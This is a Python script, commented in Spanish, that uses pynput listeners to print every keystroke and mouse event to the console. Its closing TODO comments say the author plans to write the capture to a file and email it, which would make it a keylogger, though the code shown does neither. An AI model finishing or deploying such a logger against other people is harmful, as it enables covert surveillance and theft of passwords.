from pynput import mouse,keyboard
import threading


def on_move(x, y):
    print('Pointer moved to {0}'.format(
        (x, y)))

def on_click(x, y, button, pressed):
    print('{0} at {1}'.format(
        'Pressed' if pressed else 'Released',
        (x, y)))
    if not pressed:
        # Stop listener
        return False

def on_scroll(x, y, dx, dy):
    print('Scrolled {0} at {1}'.format(
        'down' if dy < 0 else 'up',
        (x, y)))

def on_press(key):
    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
    except AttributeError:
        print('special key {0} pressed'.format(
            key))

def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False


listener_keyboard= keyboard.Listener(
        on_press=on_press,
        on_release=on_release)
listener_keyboard.setDaemon(True)


listener_mouse= mouse.Listener(
        on_move=on_move,
        on_click=on_click,
        on_scroll=on_scroll)
listener_mouse.setDaemon(True)

listener_keyboard.start()
listener_mouse.start()

# Obtiene hilo principal

hilo_ppal = threading.main_thread()

# Recorre hilos activos para controlar estado de su ejecución

for hilo in threading.enumerate():

    # Si el hilo es hilo_ppal continua al siguiente hilo activo

    if hilo is hilo_ppal:
        continue

    # Se obtiene información hilo actual y núm. hilos activos

    print(hilo.getName(),
          hilo.ident,
          hilo.isDaemon(),
          threading.active_count())

    # El programa esperará a que este hilo finalice:

    hilo.join()

#TODO: falta configurar para la captura en un archivo con el formato correcto
#TODO: falta configurar el envio al correo electronico